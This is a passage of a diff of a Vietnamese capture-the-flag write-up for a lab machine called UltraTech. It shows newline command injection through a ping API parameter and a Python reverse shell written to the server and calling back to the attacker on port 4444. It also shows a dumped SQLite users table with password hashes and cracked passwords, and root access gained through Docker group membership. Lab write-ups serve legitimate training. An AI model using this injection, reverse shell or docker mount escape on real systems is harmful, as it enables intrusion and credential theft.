min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.016&#x2F;0.016&#x2F;0.016&#x2F;0.000 ms</span><br><span class="line">Python 3.6.7</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0apython --version
+
+Python 2.7.15rc1
+
+http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0apython3 --version
+
+PING localhost(localhost6.localdomain6 (::1)) 56 data bytes
+64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.016 ms
+
+--- localhost ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.016&#x2F;0.016&#x2F;0.016&#x2F;0.000 ms
+Python 3.6.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Ngon ngay, cả Python 2 và Python 3 đủ cả. Giờ thì tạo reverse shell ez game.<br>Do server lọc dấu “;”, nên tôi phải dùng “\n” để thay thế, sẽ không cần option -e của echo để chuyển “\n” thành ký tự ngắt dòng do URL decode của server tự làm việc đó rồi.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0aecho &#39;import socket,subprocess,os\ns&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((&quot;10.9.226.195&quot;,4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; &gt; shell.py</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0acat shell.py</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes</span><br><span class="line">64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.017 ms</span><br><span class="line"></span><br><span class="line">--- localhost ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.017&#x2F;0.017&#x2F;0.017&#x2F;0.000 ms</span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;10.9.226.195&quot;,4444))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0aecho &#39;import socket,subprocess,os\ns&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((&quot;10.9.226.195&quot;,4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; &gt; shell.py
+
+http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0acat shell.py
+
+PING localhost(localhost6.localdomain6 (::1)) 56 data bytes
+64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.017 ms
+
+--- localhost ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.017&#x2F;0.017&#x2F;0.017&#x2F;0.000 ms
+import socket,subprocess,os
+s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.9.226.195&quot;,4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Đoạn script trông ổn đấy =)) Giờ chạy nó và lấy shell thôi.</p>
-<h2 id="Get-User-Shell"><a href="#Get-User-Shell" class="headerlink" title="Get User Shell"></a>Get User Shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 4444                    </span><br><span class="line">Listening on 0.0.0.0 4444</span><br><span class="line">Connection received on 10.10.3.122 50918</span><br><span class="line">www@ultratech-prod:~&#x2F;api$ id</span><br><span class="line">uid&#x3D;1002(www) gid&#x3D;1002(www) groups&#x3D;1002(www)</span><br><span class="line"></span><br><span class="line">www@ultratech-prod:~&#x2F;api$ ls -al</span><br><span class="line">total 80</span><br><span class="line">drwxr-xr-x   3 www www  4096 Jan 25 15:39 .</span><br><span class="line">drwxr-xr-x   5 www www  4096 Mar 22  2019 ..</span><br><span class="line">-rw-r--r--   1 www www  1750 Mar 22  2019 index.js</span><br><span class="line">drwxrwxr-x 163 www www  4096 Mar 22  2019 node_modules</span><br><span class="line">-rw-r--r--   1 www www   370 Mar 22  2019 package.json</span><br><span class="line">-rw-r--r--   1 www www 42702 Mar 22  2019 package-lock.json</span><br><span class="line">-rw-rw-r--   1 www www   212 Jan 25 15:39 shell.py</span><br><span class="line">-rw-rw-r--   1 www www   103 Mar 22  2019 start.sh</span><br><span class="line">-rw-r--r--   1 www www  8192 Mar 22  2019 utech.db.sqlite</span><br><span class="line"></span><br><span class="line">www@ultratech-prod:~&#x2F;api$ cat utech.db.sqlite</span><br><span class="line">zz��etableusersusersCREATE TABLE users (</span><br><span class="line">            login Varchar,</span><br><span class="line">            password Varchar,</span><br><span class="line">            type Int</span><br><span class="line">���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84www@ultratech-prod:~&#x2F;api$ </span><br></pre></td></tr></table></figure>
+<h2 id="Get-User-Shell"><a href="#Get-User-Shell" class="headerlink" title="Get User Shell"></a>Get User Shell</h2><pre class="line-numbers language-none"><code class="language-none">$ nc -lnvp 4444                    
+Listening on 0.0.0.0 4444
+Connection received on 10.10.3.122 50918
+www@ultratech-prod:~&#x2F;api$ id
+uid&#x3D;1002(www) gid&#x3D;1002(www) groups&#x3D;1002(www)
+
+www@ultratech-prod:~&#x2F;api$ ls -al
+total 80
+drwxr-xr-x   3 www www  4096 Jan 25 15:39 .
+drwxr-xr-x   5 www www  4096 Mar 22  2019 ..
+-rw-r--r--   1 www www  1750 Mar 22  2019 index.js
+drwxrwxr-x 163 www www  4096 Mar 22  2019 node_modules
+-rw-r--r--   1 www www   370 Mar 22  2019 package.json
+-rw-r--r--   1 www www 42702 Mar 22  2019 package-lock.json
+-rw-rw-r--   1 www www   212 Jan 25 15:39 shell.py
+-rw-rw-r--   1 www www   103 Mar 22  2019 start.sh
+-rw-r--r--   1 www www  8192 Mar 22  2019 utech.db.sqlite
+
+www@ultratech-prod:~&#x2F;api$ cat utech.db.sqlite
+zz��etableusersusersCREATE TABLE users (
+            login Varchar,
+            password Varchar,
+            type Int
+���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84www@ultratech-prod:~&#x2F;api$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Game dễ!<br>Tách username với hash password ra, ném hash đấy lên CrackStation xem có được việc gì không.<br><img src="pic3.png"><br>r00t:n100906<br>admin:mrsheafy</p>
 <h2 id="Get-Root-Shell"><a href="#Get-Root-Shell" class="headerlink" title="Get Root Shell"></a>Get Root Shell</h2><p>Chả biết thằng admin kia là ai, chỉ thấy thằng r00t có tên trong /etc/passwd, đăng nhập vào nó ngay và luôn.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www@ultratech-prod:~&#x2F;api$ su r00t</span><br><span class="line">Password: n100906</span><br><span class="line"></span><br><span class="line">r00t@ultratech-prod:&#x2F;home&#x2F;www&#x2F;api$ id</span><br><span class="line">uid&#x3D;1001(r00t) gid&#x3D;1001(r00t) groups&#x3D;1001(r00t),116(docker)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">www@ultratech-prod:~&#x2F;api$ su r00t
+Password: n100906
+
+r00t@ultratech-prod:&#x2F;home&#x2F;www&#x2F;api$ id
+uid&#x3D;1001(r00t) gid&#x3D;1001(r00t) groups&#x3D;1001(r00t),116(docker)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Ối giời ơi! Docker!<br>Kèo này có vẻ leo lên quyền root dễ thở rồi. root chứ không phải r00t nhé :/<br>Với Docker thì ngon lành rồi, xem có image nào không, rồi mount nó vào thư mục hệ thống, done!</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r00t@ultratech-prod:~$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">bash                latest              495d6437fc1e        22 months ago       15.8MB</span><br><span class="line">r00t@ultratech-prod:~$ docker run -v &#x2F;:&#x2F;mnt --rm -it bash chroot &#x2F;mnt sh</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">r00t@ultratech-prod:~$ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+bash                latest              495d6437fc1e        22 months ago       15.8MB
+r00t@ultratech-prod:~$ docker run -v &#x2F;:&#x2F;mnt --rm -it bash chroot &#x2F;mnt sh
+
+# id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
     </div>
 
     
